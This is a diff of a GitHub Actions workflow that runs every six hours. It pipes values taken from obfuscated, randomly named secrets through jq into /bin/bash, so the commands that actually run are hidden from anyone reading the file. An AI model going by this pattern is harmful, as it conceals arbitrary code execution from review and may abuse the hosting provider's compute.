@@ -2,29 +2,22 @@ name: yingjinchaoshang
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 0/6 * * *'
+    - cron: '36 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yingjinchaoshang
         env:
-          km5323: ${{ secrets.km5323 }}
+          i6: ${{ secrets.i6 }}
         run: |
-          echo $km5323 | jq -r .cd9288 | /bin/bash
-          echo $sr563 | jq -r .foo20 | /bin/bash
-          echo $z4011 | jq -r .p8662 | /bin/bash
-          echo $hofpt8 | jq -r .t96529 | /bin/bash
-          echo $mnxtx8 | jq -r .he46943 | /bin/bash
-          echo $qacq0692 | jq -r .lknwx93788 | /bin/bash
-          echo $ekimb1314 | jq -r .rrvdp867 | /bin/bash
-          echo $ok54 | jq -r .uf9417 | /bin/bash
-          echo $vhbq048 | jq -r .hbciy63 | /bin/bash
-          echo $whkp7 | jq -r .dntjg8 | /bin/bash
-          echo $gkn870 | jq -r .g59 | /bin/bash
-          echo $tdd0404 | jq -r .m4716 | /bin/bash
-          echo $jhr169 | jq -r .ylhu42 | /bin/bash
+          echo $i6 | jq -r .bd937 | /bin/bash
+          echo $sl9 | jq -r .fht570 | /bin/bash
+          echo $elwyt1210 | jq -r .vro2063 | /bin/bash
+          echo $lobc9 | jq -r .ioxq5671 | /bin/bash
+          echo $igezt5429 | jq -r .xda91 | /bin/bash
+          echo $q6746 | jq -r .ojq6 | /bin/bash
+          echo $hscj94 | jq -r .avwb4895 | /bin/bash
 
